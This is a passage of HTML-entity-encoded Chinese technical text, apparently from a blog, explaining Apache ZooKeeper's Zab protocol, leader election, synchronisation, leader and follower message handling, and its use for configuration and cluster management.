FOLLOWING&#xFF1A;leader&#x5DF2;&#x7ECF;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#xFF0C;&#x5F53;&#x524D;Server&#x4E0E;&#x4E4B;&#x540C;&#x6B65;","keywords":null,"text":"Zookeeper&#x7684;&#x6838;&#x5FC3;&#x662F;&#x539F;&#x5B50;&#x5E7F;&#x64AD;&#xFF0C;&#x8FD9;&#x4E2A;&#x673A;&#x5236;&#x4FDD;&#x8BC1;&#x4E86;&#x5404;&#x4E2A;Server&#x4E4B;&#x95F4;&#x7684;&#x540C;&#x6B65;&#x3002;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A;&#x673A;&#x5236;&#x7684;&#x534F;&#x8BAE;&#x53EB;&#x505A;Zab&#x534F;&#x8BAE;&#x3002;Zab&#x534F;&#x8BAE;&#x6709;&#x4E24;&#x79CD;&#x6A21;&#x5F0F;&#xFF0C;&#x5B83;&#x4EEC;&#x5206;&#x522B;&#x662F;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#xFF08;&#x9009;&#x4E3B;&#xFF09;&#x548C;&#x5E7F;&#x64AD;&#x6A21;&#x5F0F;&#xFF08;&#x540C;&#x6B65;&#xFF09;&#x3002;&#x5F53;&#x670D;&#x52A1;&#x542F;&#x52A8;&#x6216;&#x8005;&#x5728;&#x9886;&#x5BFC;&#x8005;&#x5D29;&#x6E83;&#x540E;&#xFF0C;Zab&#x5C31;&#x8FDB;&#x5165;&#x4E86;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#xFF0C;&#x5F53;&#x9886;&#x5BFC;&#x8005;&#x88AB;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#xFF0C;&#x4E14;&#x5927;&#x591A;&#x6570;Server&#x5B8C;&#x6210;&#x4E86;&#x548C;leader&#x7684;&#x72B6;&#x6001;&#x540C;&#x6B65;&#x4EE5;&#x540E;&#xFF0C;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#x5C31;&#x7ED3;&#x675F;&#x4E86;&#x3002;&#x72B6;&#x6001;&#x540C;&#x6B65;&#x4FDD;&#x8BC1;&#x4E86;leader&#x548C;Server&#x5177;&#x6709;&#x76F8;&#x540C;&#x7684;&#x7CFB;&#x7EDF;&#x72B6;&#x6001;&#x3002; &#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x4E8B;&#x52A1;&#x7684;&#x987A;&#x5E8F;&#x4E00;&#x81F4;&#x6027;&#xFF0C;zookeeper&#x91C7;&#x7528;&#x4E86;&#x9012;&#x589E;&#x7684;&#x4E8B;&#x52A1;id&#x53F7;&#xFF08;zxid&#xFF09;&#x6765;&#x6807;&#x8BC6;&#x4E8B;&#x52A1;&#x3002;&#x6240;&#x6709;&#x7684;&#x63D0;&#x8BAE;&#xFF08;proposal&#xFF09;&#x90FD;&#x5728;&#x88AB;&#x63D0;&#x51FA;&#x7684;&#x65F6;&#x5019;&#x52A0;&#x4E0A;&#x4E86;zxid&#x3002;&#x5B9E;&#x73B0;&#x4E2D;zxid&#x662F;&#x4E00;&#x4E2A;64&#x4F4D;&#x7684;&#x6570;&#x5B57;&#xFF0C;&#x5B83;&#x9AD8;32&#x4F4D;&#x662F;epoch&#x7528;&#x6765;&#x6807;&#x8BC6;leader&#x5173;&#x7CFB;&#x662F;&#x5426;&#x6539;&#x53D8;&#xFF0C;&#x6BCF;&#x6B21;&#x4E00;&#x4E2A;leader&#x88AB;&#x9009;&#x51FA;&#x6765;&#xFF0C;&#x5B83;&#x90FD;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x65B0;&#x7684;epoch&#xFF0C;&#x6807;&#x8BC6;&#x5F53;&#x524D;&#x5C5E;&#x4E8E;&#x90A3;&#x4E2A;leader&#x7684;&#x7EDF;&#x6CBB;&#x65F6;&#x671F;&#x3002;&#x4F4E;32&#x4F4D;&#x7528;&#x4E8E;&#x9012;&#x589E;&#x8BA1;&#x6570;&#x3002; &#x6BCF;&#x4E2A;Server&#x5728;&#x5DE5;&#x4F5C;&#x8FC7;&#x7A0B;&#x4E2D;&#x6709;&#x4E09;&#x79CD;&#x72B6;&#x6001;&#xFF1A; LOOKING&#xFF1A;&#x5F53;&#x524D;Server&#x4E0D;&#x77E5;&#x9053;leader&#x662F;&#x8C01;&#xFF0C;&#x6B63;&#x5728;&#x641C;&#x5BFB; LEADING&#xFF1A;&#x5F53;&#x524D;Server&#x5373;&#x4E3A;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#x7684;leader FOLLOWING&#xFF1A;leader&#x5DF2;&#x7ECF;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#xFF0C;&#x5F53;&#x524D;Server&#x4E0E;&#x4E4B;&#x540C;&#x6B65; &#x9009;&#x4E3B;&#x6D41;&#x7A0B;&#x5F53;leader&#x5D29;&#x6E83;&#x6216;&#x8005;leader&#x5931;&#x53BB;&#x5927;&#x591A;&#x6570;&#x7684;follower&#xFF0C;&#x8FD9;&#x65F6;&#x5019;zk&#x8FDB;&#x5165;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#xFF0C;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x9009;&#x4E3E;&#x51FA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;leader&#xFF0C;&#x8BA9;&#x6240;&#x6709;&#x7684;Server&#x90FD;&#x6062;&#x590D;&#x5230;&#x4E00;&#x4E2A;&#x6B63;&#x786E;&#x7684;&#x72B6;&#x6001;&#x3002;Zk&#x7684;&#x9009;&#x4E3E;&#x7B97;&#x6CD5;&#x6709;&#x4E24;&#x79CD;&#xFF1A;&#x4E00;&#x79CD;&#x662F;&#x57FA;&#x4E8E;basic paxos&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x79CD;&#x662F;&#x57FA;&#x4E8E;fast paxos&#x7B97;&#x6CD5;&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x7684;&#x9009;&#x4E3E;&#x7B97;&#x6CD5;&#x4E3A;fast paxos&#x3002;&#x5148;&#x4ECB;&#x7ECD;basic paxos&#x6D41;&#x7A0B;&#xFF1A; 1&#x3001;&#x9009;&#x4E3E;&#x7EBF;&#x7A0B;&#x7531;&#x5F53;&#x524D;Server&#x53D1;&#x8D77;&#x9009;&#x4E3E;&#x7684;&#x7EBF;&#x7A0B;&#x62C5;&#x4EFB;&#xFF0C;&#x5176;&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x662F;&#x5BF9;&#x6295;&#x7968;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x7EDF;&#x8BA1;&#xFF0C;&#x5E76;&#x9009;&#x51FA;&#x63A8;&#x8350;&#x7684;Server&#xFF1B;2&#x3001;&#x9009;&#x4E3E;&#x7EBF;&#x7A0B;&#x9996;&#x5148;&#x5411;&#x6240;&#x6709;Server&#x53D1;&#x8D77;&#x4E00;&#x6B21;&#x8BE2;&#x95EE;(&#x5305;&#x62EC;&#x81EA;&#x5DF1;)&#xFF1B;3&#x3001;&#x9009;&#x4E3E;&#x7EBF;&#x7A0B;&#x6536;&#x5230;&#x56DE;&#x590D;&#x540E;&#xFF0C;&#x9A8C;&#x8BC1;&#x662F;&#x5426;&#x662F;&#x81EA;&#x5DF1;&#x53D1;&#x8D77;&#x7684;&#x8BE2;&#x95EE;(&#x9A8C;&#x8BC1;zxid&#x662F;&#x5426;&#x4E00;&#x81F4;)&#xFF0C;&#x7136;&#x540E;&#x83B7;&#x53D6;&#x5BF9;&#x65B9;&#x7684;id(myid)&#xFF0C;&#x5E76;&#x5B58;&#x50A8;&#x5230;&#x5F53;&#x524D;&#x8BE2;&#x95EE;&#x5BF9;&#x8C61;&#x5217;&#x8868;&#x4E2D;&#xFF0C;&#x6700;&#x540E;&#x83B7;&#x53D6;&#x5BF9;&#x65B9;&#x63D0;&#x8BAE;&#x7684;leader&#x76F8;&#x5173;&#x4FE1;&#x606F;(id,zxid)&#xFF0C;&#x5E76;&#x5C06;&#x8FD9;&#x4E9B;&#x4FE1;&#x606F;&#x5B58;&#x50A8;&#x5230;&#x5F53;&#x6B21;&#x9009;&#x4E3E;&#x7684;&#x6295;&#x7968;&#x8BB0;&#x5F55;&#x8868;&#x4E2D;&#xFF1B;4&#x3001;&#x6536;&#x5230;&#x6240;&#x6709;Server&#x56DE;&#x590D;&#x4EE5;&#x540E;&#xFF0C;&#x5C31;&#x8BA1;&#x7B97;&#x51FA;zxid&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;Server&#xFF0C;&#x5E76;&#x5C06;&#x8FD9;&#x4E2A;Server&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x8BBE;&#x7F6E;&#x6210;&#x4E0B;&#x4E00;&#x6B21;&#x8981;&#x6295;&#x7968;&#x7684;Server&#xFF1B;5&#x3001;&#x7EBF;&#x7A0B;&#x5C06;&#x5F53;&#x524D;zxid&#x6700;&#x5927;&#x7684;Server&#x8BBE;&#x7F6E;&#x4E3A;&#x5F53;&#x524D;Server&#x8981;&#x63A8;&#x8350;&#x7684;Leader&#xFF0C;&#x5982;&#x679C;&#x6B64;&#x65F6;&#x83B7;&#x80DC;&#x7684;Server&#x83B7;&#x5F97;n/2 + 1&#x7684;Server&#x7968;&#x6570;&#xFF0C; &#x8BBE;&#x7F6E;&#x5F53;&#x524D;&#x63A8;&#x8350;&#x7684;leader&#x4E3A;&#x83B7;&#x80DC;&#x7684;Server&#xFF0C;&#x5C06;&#x6839;&#x636E;&#x83B7;&#x80DC;&#x7684;Server&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x8BBE;&#x7F6E;&#x81EA;&#x5DF1;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x5426;&#x5219;&#xFF0C;&#x7EE7;&#x7EED;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF0C;&#x76F4;&#x5230;leader&#x88AB;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#x3002; &#x901A;&#x8FC7;&#x6D41;&#x7A0B;&#x5206;&#x6790;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x51FA;&#xFF1A;&#x8981;&#x4F7F;Leader&#x83B7;&#x5F97;&#x591A;&#x6570;Server&#x7684;&#x652F;&#x6301;&#xFF0C;&#x5219;Server&#x603B;&#x6570;&#x5FC5;&#x987B;&#x662F;&#x5947;&#x6570;2n+1&#xFF0C;&#x4E14;&#x5B58;&#x6D3B;&#x7684;Server&#x7684;&#x6570;&#x76EE;&#x4E0D;&#x5F97;&#x5C11;&#x4E8E;n+1. &#x6BCF;&#x4E2A;Server&#x542F;&#x52A8;&#x540E;&#x90FD;&#x4F1A;&#x91CD;&#x590D;&#x4EE5;&#x4E0A;&#x6D41;&#x7A0B;&#x3002;&#x5728;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x521A;&#x4ECE;&#x5D29;&#x6E83;&#x72B6;&#x6001;&#x6062;&#x590D;&#x7684;&#x6216;&#x8005;&#x521A;&#x542F;&#x52A8;&#x7684;server&#x8FD8;&#x4F1A;&#x4ECE;&#x78C1;&#x76D8;&#x5FEB;&#x7167;&#x4E2D;&#x6062;&#x590D;&#x6570;&#x636E;&#x548C;&#x4F1A;&#x8BDD;&#x4FE1;&#x606F;&#xFF0C;zk&#x4F1A;&#x8BB0;&#x5F55;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x5E76;&#x5B9A;&#x671F;&#x8FDB;&#x884C;&#x5FEB;&#x7167;&#xFF0C;&#x65B9;&#x4FBF;&#x5728;&#x6062;&#x590D;&#x65F6;&#x8FDB;&#x884C;&#x72B6;&#x6001;&#x6062;&#x590D;&#x3002;&#x9009;&#x4E3B;&#x7684;&#x5177;&#x4F53;&#x6D41;&#x7A0B;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A; fast paxos&#x6D41;&#x7A0B;&#x662F;&#x5728;&#x9009;&#x4E3E;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x67D0;Server&#x9996;&#x5148;&#x5411;&#x6240;&#x6709;Server&#x63D0;&#x8BAE;&#x81EA;&#x5DF1;&#x8981;&#x6210;&#x4E3A;leader&#xFF0C;&#x5F53;&#x5176;&#x5B83;Server&#x6536;&#x5230;&#x63D0;&#x8BAE;&#x4EE5;&#x540E;&#xFF0C;&#x89E3;&#x51B3;epoch&#x548C;zxid&#x7684;&#x51B2;&#x7A81;&#xFF0C;&#x5E76;&#x63A5;&#x53D7;&#x5BF9;&#x65B9;&#x7684;&#x63D0;&#x8BAE;&#xFF0C;&#x7136;&#x540E;&#x5411;&#x5BF9;&#x65B9;&#x53D1;&#x9001;&#x63A5;&#x53D7;&#x63D0;&#x8BAE;&#x5B8C;&#x6210;&#x7684;&#x6D88;&#x606F;&#xFF0C;&#x91CD;&#x590D;&#x8FD9;&#x4E2A;&#x6D41;&#x7A0B;&#xFF0C;&#x6700;&#x540E;&#x4E00;&#x5B9A;&#x80FD;&#x9009;&#x4E3E;&#x51FA;Leader&#x3002;&#x5176;&#x6D41;&#x7A0B;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A; &#x540C;&#x6B65;&#x6D41;&#x7A0B;&#x9009;&#x5B8C;leader&#x4EE5;&#x540E;&#xFF0C;zk&#x5C31;&#x8FDB;&#x5165;&#x72B6;&#x6001;&#x540C;&#x6B65;&#x8FC7;&#x7A0B;&#x3002;1&#x3001;leader&#x7B49;&#x5F85;server&#x8FDE;&#x63A5;&#xFF1B;2&#x3001;Follower&#x8FDE;&#x63A5;leader&#xFF0C;&#x5C06;&#x6700;&#x5927;&#x7684;zxid&#x53D1;&#x9001;&#x7ED9;leader&#xFF1B;3&#x3001;Leader&#x6839;&#x636E;follower&#x7684;zxid&#x786E;&#x5B9A;&#x540C;&#x6B65;&#x70B9;&#xFF1B;4&#x3001;&#x5B8C;&#x6210;&#x540C;&#x6B65;&#x540E;&#x901A;&#x77E5;follower &#x5DF2;&#x7ECF;&#x6210;&#x4E3A;uptodate&#x72B6;&#x6001;&#xFF1B;5&#x3001;Follower&#x6536;&#x5230;uptodate&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x53C8;&#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x63A5;&#x53D7;client&#x7684;&#x8BF7;&#x6C42;&#x8FDB;&#x884C;&#x670D;&#x52A1;&#x4E86;&#x3002; &#x6D41;&#x7A0B;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A; &#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;Leader&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;Leader&#x4E3B;&#x8981;&#x6709;&#x4E09;&#x4E2A;&#x529F;&#x80FD;&#xFF1A;1&#x3001;&#x6062;&#x590D;&#x6570;&#x636E;&#xFF1B;2&#x3001;&#x7EF4;&#x6301;&#x4E0E;Learner&#x7684;&#x5FC3;&#x8DF3;&#xFF0C;&#x63A5;&#x6536;Learner&#x8BF7;&#x6C42;&#x5E76;&#x5224;&#x65AD;Learner&#x7684;&#x8BF7;&#x6C42;&#x6D88;&#x606F;&#x7C7B;&#x578B;&#xFF1B;3&#x3001;Learner&#x7684;&#x6D88;&#x606F;&#x7C7B;&#x578B;&#x4E3B;&#x8981;&#x6709;PING&#x6D88;&#x606F;&#x3001;REQUEST&#x6D88;&#x606F;&#x3001;ACK&#x6D88;&#x606F;&#x3001;REVALIDATE&#x6D88;&#x606F;&#xFF0C;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;&#x6D88;&#x606F;&#x7C7B;&#x578B;&#xFF0C;&#x8FDB;&#x884C;&#x4E0D;&#x540C;&#x7684;&#x5904;&#x7406;&#x3002; PING&#x6D88;&#x606F;&#x662F;&#x6307;Learner&#x7684;&#x5FC3;&#x8DF3;&#x4FE1;&#x606F;&#xFF1B;REQUEST&#x6D88;&#x606F;&#x662F;Follower&#x53D1;&#x9001;&#x7684;&#x63D0;&#x8BAE;&#x4FE1;&#x606F;&#xFF0C;&#x5305;&#x62EC;&#x5199;&#x8BF7;&#x6C42;&#x53CA;&#x540C;&#x6B65;&#x8BF7;&#x6C42;&#xFF1B;ACK&#x6D88;&#x606F;&#x662F;Follower&#x7684;&#x5BF9;&#x63D0;&#x8BAE;&#x7684;&#x56DE;&#x590D;&#xFF0C;&#x8D85;&#x8FC7;&#x534A;&#x6570;&#x7684;Follower&#x901A;&#x8FC7;&#xFF0C;&#x5219;commit&#x8BE5;&#x63D0;&#x8BAE;&#xFF1B;REVALIDATE&#x6D88;&#x606F;&#x662F;&#x7528;&#x6765;&#x5EF6;&#x957F;SESSION&#x6709;&#x6548;&#x65F6;&#x95F4;&#x3002; Leader&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;&#x7B80;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF0C;&#x5728;&#x5B9E;&#x9645;&#x5B9E;&#x73B0;&#x4E2D;&#xFF0C;&#x6D41;&#x7A0B;&#x8981;&#x6BD4;&#x4E0B;&#x56FE;&#x590D;&#x6742;&#x5F97;&#x591A;&#xFF0C;&#x542F;&#x52A8;&#x4E86;&#x4E09;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x3002; Follower&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;Follower&#x4E3B;&#x8981;&#x6709;&#x56DB;&#x4E2A;&#x529F;&#x80FD;&#xFF1A;1&#x3001;&#x5411;Leader&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#xFF08;PING&#x6D88;&#x606F;&#x3001;REQUEST&#x6D88;&#x606F;&#x3001;ACK&#x6D88;&#x606F;&#x3001;REVALIDATE&#x6D88;&#x606F;&#xFF09;&#xFF1B;2&#x3001;&#x63A5;&#x6536;Leader&#x6D88;&#x606F;&#x5E76;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF1B;3&#x3001;&#x63A5;&#x6536;Client&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5982;&#x679C;&#x4E3A;&#x5199;&#x8BF7;&#x6C42;&#xFF0C;&#x53D1;&#x9001;&#x7ED9;Leader&#x8FDB;&#x884C;&#x6295;&#x7968;&#xFF1B;4&#x3001;&#x8FD4;&#x56DE;Client&#x7ED3;&#x679C;&#x3002; Follower&#x7684;&#x6D88;&#x606F;&#x5FAA;&#x73AF;&#x5904;&#x7406;&#x5982;&#x4E0B;&#x51E0;&#x79CD;&#x6765;&#x81EA;Leader&#x7684;&#x6D88;&#x606F;&#xFF1A; 1&#x3001;ING&#x6D88;&#x606F;&#xFF1A; &#x5FC3;&#x8DF3;&#x6D88;&#x606F;&#xFF1B;2&#x3001;PROPOSAL&#x6D88;&#x606F;&#xFF1A;Leader&#x53D1;&#x8D77;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x8981;&#x6C42;Follower&#x6295;&#x7968;&#xFF1B;3&#x3001;COMMIT&#x6D88;&#x606F;&#xFF1A;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x6700;&#x65B0;&#x4E00;&#x6B21;&#x63D0;&#x6848;&#x7684;&#x4FE1;&#x606F;&#xFF1B;4&#x3001;UPTODATE&#x6D88;&#x606F;&#xFF1A;&#x8868;&#x660E;&#x540C;&#x6B65;&#x5B8C;&#x6210;&#xFF1B;5&#x3001;REVALIDATE&#x6D88;&#x606F;&#xFF1A;&#x6839;&#x636E;Leader&#x7684;REVALIDATE&#x7ED3;&#x679C;&#xFF0C;&#x5173;&#x95ED;&#x5F85;revalidate&#x7684;session&#x8FD8;&#x662F;&#x5141;&#x8BB8;&#x5176;&#x63A5;&#x53D7;&#x6D88;&#x606F;&#xFF1B;6&#x3001;SYNC&#x6D88;&#x606F;&#xFF1A;&#x8FD4;&#x56DE;SYNC&#x7ED3;&#x679C;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x8FD9;&#x4E2A;&#x6D88;&#x606F;&#x6700;&#x521D;&#x7531;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x8D77;&#xFF0C;&#x7528;&#x6765;&#x5F3A;&#x5236;&#x5F97;&#x5230;&#x6700;&#x65B0;&#x7684;&#x66F4;&#x65B0;&#x3002; Follower&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;&#x7B80;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF0C;&#x5728;&#x5B9E;&#x9645;&#x5B9E;&#x73B0;&#x4E2D;&#xFF0C;Follower&#x662F;&#x901A;&#x8FC7;5&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x7684;&#x3002; &#x5BF9;&#x4E8E;observer&#x7684;&#x6D41;&#x7A0B;&#x4E0D;&#x518D;&#x53D9;&#x8FF0;&#xFF0C;observer&#x6D41;&#x7A0B;&#x548C;Follower&#x7684;&#x552F;&#x4E00;&#x4E0D;&#x540C;&#x7684;&#x5730;&#x65B9;&#x5C31;&#x662F;observer&#x4E0D;&#x4F1A;&#x53C2;&#x52A0;leader&#x53D1;&#x8D77;&#x7684;&#x6295;&#x7968;&#x3002; &#x4E3B;&#x6D41;&#x5E94;&#x7528;&#x573A;&#x666F;Zookeeper&#x7684;&#x4E3B;&#x6D41;&#x5E94;&#x7528;&#x573A;&#x666F;&#x5B9E;&#x73B0;&#x601D;&#x8DEF;&#xFF08;&#x9664;&#x53BB;&#x5B98;&#x65B9;&#x793A;&#x4F8B;&#xFF09; &#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x96C6;&#x4E2D;&#x5F0F;&#x7684;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x5728;&#x5E94;&#x7528;&#x96C6;&#x7FA4;&#x4E2D;&#x662F;&#x975E;&#x5E38;&#x5E38;&#x89C1;&#x7684;&#xFF0C;&#x4E00;&#x822C;&#x5546;&#x4E1A;&#x516C;&#x53F8;&#x5185;&#x90E8;&#x90FD;&#x4F1A;&#x5B9E;&#x73B0;&#x4E00;&#x5957;&#x96C6;&#x4E2D;&#x7684;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x4E2D;&#x5FC3;&#xFF0C;&#x5E94;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x5E94;&#x7528;&#x96C6;&#x7FA4;&#x5BF9;&#x4E8E;&#x5171;&#x4EAB;&#x5404;&#x81EA;&#x914D;&#x7F6E;&#x7684;&#x9700;&#x6C42;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x914D;&#x7F6E;&#x53D8;&#x66F4;&#x65F6;&#x80FD;&#x591F;&#x901A;&#x77E5;&#x5230;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x3002; Zookeeper&#x5F88;&#x5BB9;&#x6613;&#x5B9E;&#x73B0;&#x8FD9;&#x79CD;&#x96C6;&#x4E2D;&#x5F0F;&#x7684;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#xFF0C;&#x6BD4;&#x5982;&#x5C06;APP1&#x7684;&#x6240;&#x6709;&#x914D;&#x7F6E;&#x914D;&#x7F6E;&#x5230;/APP1 znode&#x4E0B;&#xFF0C;APP1&#x6240;&#x6709;&#x673A;&#x5668;&#x4E00;&#x542F;&#x52A8;&#x5C31;&#x5BF9;/APP1&#x8FD9;&#x4E2A;&#x8282;&#x70B9;&#x8FDB;&#x884C;&#x76D1;&#x63A7;(zk.exist(&#x201C;/APP1&#x201D;,true)),&#x5E76;&#x4E14;&#x5B9E;&#x73B0;&#x56DE;&#x8C03;&#x65B9;&#x6CD5;Watcher&#xFF0C;&#x90A3;&#x4E48;&#x5728;zookeeper&#x4E0A;/APP1 znode&#x8282;&#x70B9;&#x4E0B;&#x6570;&#x636E;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6BCF;&#x4E2A;&#x673A;&#x5668;&#x90FD;&#x4F1A;&#x6536;&#x5230;&#x901A;&#x77E5;&#xFF0C;Watcher&#x65B9;&#x6CD5;&#x5C06;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x7528;&#x518D;&#x53D6;&#x4E0B;&#x6570;&#x636E;&#x5373;&#x53EF;(zk.getData(&#x201C;/APP1&#x201D;,false,null)); &#x4EE5;&#x4E0A;&#x8FD9;&#x4E2A;&#x4F8B;&#x5B50;&#x53EA;&#x662F;&#x7B80;&#x5355;&#x7684;&#x7C97;&#x9897;&#x7C92;&#x5EA6;&#x914D;&#x7F6E;&#x76D1;&#x63A7;&#xFF0C;&#x7EC6;&#x9897;&#x7C92;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5206;&#x5C42;&#x7EA7;&#x76D1;&#x63A7;&#xFF0C;&#x8FD9;&#x4E00;&#x5207;&#x90FD;&#x662F;&#x53EF;&#x4EE5;&#x8BBE;&#x8BA1;&#x548C;&#x63A7;&#x5236;&#x7684;&#x3002; &#x96C6;&#x7FA4;&#x7BA1;&#x7406;&#x5E94;&#x7528;&#x96C6;&#x7FA4;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5E38;&#x5E38;&#x9700;&#x8981;&#x8BA9;&#x6BCF;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x77E5;&#x9053;&#x96C6;&#x7FA4;&#x4E2D;&#xFF08;&#x6216;&#x4F9D;&#x8D56;&#x7684;&#x5176;&#x4ED6;&#x67D0;&#x4E00;&#x4E2A;&#x96C6;&#x7FA4;&#xFF09;&#x54EA;&#x4E9B;&#x673A;&#x5668;&#x662F;&#x6D3B;&#x7740;&#x7684;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x96C6;&#x7FA4;&#x673A;&#x5668;&#x56E0;&#x4E3A;&#x5B95;&#x673A;&#xFF0C;&#x7F51;&#x7EDC;&#x65AD;&#x94FE;&#x7B49;&#x539F;&#x56E0;&#x80FD;&#x591F;&#x4E0D;&#x5728;&#x4EBA;&#x5DE5;&#x4ECB;&#x5165;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8FC5;&#x901F;&#x901A;&#x77E5;&#x5230;&#x6BCF;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x3002; Zookeeper&#x540C;&#x6837;&#x5F88;&#x5BB9;&#x6613;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A;&#x529F;&#x80FD;&#xFF0C;&#x6BD4;&#x5982;&#x6211;&#x5728;zookeeper&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x6709;&#x4E00;&#x4E2A;znode&#x53EB;/APP1SERVERS,&#x90A3;&#x4E48;&#x96C6;&#x7FA4;&#x4E2D;&#x6BCF;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x542F;&#x52A8;&#x7684;&#x65F6;&#x5019;&#x90FD;&#x53BB;&#x8FD9;&#x4E2A;&#x8282;&#x70B9;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;EPHEMERAL&#x7C7B;&#x578B;&#x7684;&#x8282;&#x70B9;&#xFF0C;&#x6BD4;&#x5982;server1&#x521B;&#x5EFA;/APP1SERVERS/SERVER1(&#x53EF;&#x4EE5;&#x4F7F;&#x7528;ip,&#x4FDD;&#x8BC1;&#x4E0D;&#x91CD;&#x590D;)&#xFF0C;server2&#x521B;&#x5EFA;/APP1SERVERS/SERVER2&#xFF0C;&#x7136;&#x540E;SERVER1&#x548C;SERVER2&#x90FD;watch /APP1SERVERS&#x8FD9;&#x4E2A;&#x7236;&#x8282;&#x70B9;&#xFF0C;&#x90A3;&#x4E48;&#x4E5F;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x7236;&#x8282;&#x70B9;&#x4E0B;&#x6570;&#x636E;&#x6216;&#x8005;&#x5B50;&#x8282;&#x70B9;&#x53D8;&#x5316;&#x90FD;&#x4F1A;&#x901A;&#x77E5;&#x5BF9;&#x8BE5;&#x8282;&#x70B9;&#x8FDB;&#x884C;watch&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x56E0;&#x4E3A;EPHEMERAL&#x7C7B;&#x578B;&#x8282;&#x70B9;&#x6709;&#x4E00;&#x4E2A;&#x5F88;&#x91CD;&#x8981;&#x7684;&#x7279;&#x6027;&#xFF0C;&#x5C31;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8FDE;&#x63A5;&#x65AD;&#x6389;&#x6216;&#x8005;session&#x8FC7;&#x671F;&#x5C31;&#x4F1A;&#x4F7F;&#x8282;&#x70B9;&#x6D88;&#x5931;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x67D0;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x6302;&#x6389;&#x6216;&#x8005;&#x65AD;&#x94FE;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x8282;&#x70B9;&#x5C31;&#x4F1A;&#x6D88;&#x5931;&#xFF0C;&#x7136;&#x540E;&#x96C6;&#x7FA4;&#x4E2D;&#x6240;&#x6709;&#x5BF9;/APP1SERVERS&#x8FDB;&#x884C;watch&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x90FD;&#x4F1A;&#x6536;&#x5230;&#x901A;&#x77E5;&#xFF0C;&#x7136;&#x540E;&#x53D6